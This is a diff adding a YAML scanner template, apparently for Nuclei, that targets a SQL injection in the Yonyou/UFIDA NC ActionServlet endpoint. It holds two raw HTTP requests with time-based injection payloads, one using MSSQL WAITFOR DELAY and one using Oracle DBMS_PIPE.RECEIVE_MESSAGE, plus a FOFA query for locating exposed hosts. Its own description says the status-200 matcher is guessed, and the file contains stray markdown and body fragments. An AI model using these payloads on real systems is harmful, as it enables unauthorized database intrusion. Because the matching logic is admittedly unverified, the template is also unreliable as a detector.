@@ -1,0 +1,45 @@
+id: poc-de84hgmp6euyssla
+info:
+  name: 用友NC-ActionServlet-sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/de84hgmp6euyssla
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: de84hgmp6euyssla
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1'')%20WAITFOR%20DELAY%20''0:0:6''--+&unitID=public HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    SOAPAction: [http://tempuri.org/GetHomeInfo](http://tempuri.org/GetHomeInfo)
+
+
+
+
+    oracle:'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iuforeport.rep.FormulaViewAction&method=execute&repID=1'')%20AND%206371%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28107%29%7C%7CCHR%2866%29%7C%7CCHR%28105%29%7C%7CCHR%2889%29%2C6%29--&unitID=public HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    SOAPAction: [http://tempuri.org/GetHomeInfo](http://tempuri.org/GetHomeInfo)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
